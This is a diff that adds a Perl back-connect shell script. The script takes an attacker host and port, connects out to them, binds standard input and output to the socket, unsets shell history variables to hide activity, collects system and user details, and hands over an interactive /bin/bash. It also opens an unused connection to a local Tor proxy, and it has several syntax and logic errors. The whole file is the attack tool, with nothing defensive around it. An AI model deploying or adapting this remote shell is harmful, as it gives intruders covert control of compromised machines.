@@ -1,0 +1,24 @@
+#!/usr/bin/perl
+use IO::Socket;
+
+$system = '/bin/bash';
+unless (@ARGV == 2)
+{ die "usage: $0 host port"}
+($host, $port) = @ARGV;
+
+$socket = IO::Socket::INET->new(PeerAddr => "127.0.0.1",
+				PeerPort => "9050",
+				Proto 	 => "tcp",
+				Type     => SOCK_STREAM
+				Timeout  => 60)
+ or die "connection can't be established\r\n";
+
+connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) or "connection can't be established\r\n";
+SOCKET->autoflush();
+open(STDIN, ">&SOCKET");
+open(STDOUT, ">&SOCKET");
+open(STDERR, ">&SOCKET");
+
+system("unset HISTFILE; unset SAVEHIST ;echo =#Systeminfo#=; uname -a;echo; echo -+Userinfo+-; id; echo; echo =Directory=; pwd; echo; echo =Shell=");
+system("whoami && groups && users");
+system("$system");
